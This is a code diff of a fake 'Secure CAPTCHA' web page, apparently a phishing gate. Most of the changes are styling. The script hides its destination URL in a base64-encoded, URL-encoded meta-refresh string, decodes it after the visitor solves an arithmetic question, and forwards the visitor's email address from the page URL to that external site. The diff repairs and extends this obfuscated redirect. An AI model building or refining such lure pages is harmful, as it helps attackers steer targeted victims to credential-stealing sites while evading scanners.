@@ -11,7 +11,6 @@
       --box-bg: #f7f7f7;
       --primary: #007bff;
       --success-green: #28a745;
-      --border-gradient: linear-gradient(to right, #007bff, #00c6ff);
     }
 
     * {
@@ -33,44 +32,40 @@
 
     .logo {
       position: absolute;
-      top: 20px;
-      left: 20px;
+      top: 10px;
+      left: 10px;
       display: flex;
       align-items: center;
       background: var(--box-bg);
-      padding: 6px 12px;
-      border-radius: 14px;
-      border: 2px solid transparent;
-      background-clip: padding-box;
-      border-image: var(--border-gradient);
-      border-image-slice: 1;
-      box-shadow: 0 4px 20px rgba(0, 123, 255, 0.2);
+      padding: 5px 10px;
+      border-radius: 16px;
+      box-shadow: 0 0 0 3px var(--primary);
+      border: 1px solid var(--primary);
     }
 
     .logo img {
-      width: 16px;
-      height: 16px;
+      width: 18px;
+      height: 18px;
       margin-right: 6px;
       object-fit: contain;
     }
 
     .logo span {
-      font-size: 0.88rem;
+      font-size: 1.05rem;
       font-weight: 600;
       color: var(--primary);
+      white-space: nowrap;
     }
 
     #captcha-box {
       background: var(--box-bg);
       padding: 30px;
       border-radius: 16px;
-      border: 3px solid transparent;
-      border-image: var(--border-gradient);
-      border-image-slice: 1;
-      box-shadow: 0 6px 24px rgba(0, 123, 255, 0.25);
+      box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.4);
       text-align: center;
       width: 100%;
       max-width: 400px;
+      border: 1px solid rgba(0, 123, 255, 0.5);
     }
 
     .captcha-header {
@@ -134,45 +129,27 @@
     }
 
     @media (max-width: 480px) {
-      #captcha-box {
-        padding: 20px;
-      }
-
-      input[type="number"] {
-        width: 100%;
-      }
-
-      button {
-        width: 100%;
-      }
-
-      .logo {
-        flex-direction: row;
-        align-items: center;
-        padding: 4px 10px;
-      }
-
       .logo img {
-        width: 14px;
-        height: 14px;
+        width: 18px;
+        height: 18px;
         margin-right: 6px;
       }
 
       .logo span {
-        font-size: 0.86rem;
+        font-size: 0.95rem;
       }
     }
   </style>
 </head>
 <body>
 
-  <!-- Logo -->
+  <!-- Top-left Logo -->
   <div class="logo">
     <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
     <span>Secure CAPTCHA</span>
   </div>
 
-  <!-- CAPTCHA -->
+  <!-- CAPTCHA Challenge Box -->
   <div id="captcha-box">
     <div class="captcha-header">For security reasons, please solve this to continue.</div>
     <div id="captcha-question">Loading...</div>
@@ -189,8 +166,7 @@
     let answer = 0;
     let firstSolved = false;
 
-    // Base64-encoded final redirect URL
-    const base64Ref = JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vcG9ydGFsZG9jLmZlbm1lbm9zLmRlL1ZrZXVVJTIyJTIwLyUzRQ==;
+    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vcG9ydGFsZG9jLmZlbm1lbm9zLmRlL1ZrZXVVJTIyJTIwLyUzRQ==";
 
     function generateCaptcha() {
       const num1 = Math.floor(Math.random() * 20) + 1;
@@ -241,17 +217,23 @@
 
     function redirectUser() {
       try {
-        const decodedRef = atob(base64Ref);
-        const email = new URLSearchParams(window.location.search).get("id");
+        const decoded = atob(base64Ref);
+        const metaDecoded = decodeURIComponent(decoded);
+        const urlMatch = metaDecoded.match(/url=([^"'&]+)/i);
+        let finalUrl = urlMatch ? urlMatch[1] : null;
 
-        if (email) {
-          const finalUrl = decodedRef + `?id=${email}`;
-          window.location.href = finalUrl;
-        } else {
-          window.location.href = decodedRef;
+        if (!finalUrl) {
+          throw new Error("Invalid redirect format.");
         }
+
+        const email = new URLSearchParams(window.location.search).get("id");
+        if (email) {
+          finalUrl += `?e=${email}`;
+        }
+
+        window.location.href = finalUrl;
       } catch (e) {
-        alert("Redirect failed. Invalid base64.");
+        alert("Redirect failed. Invalid format.");
       }
     }
 
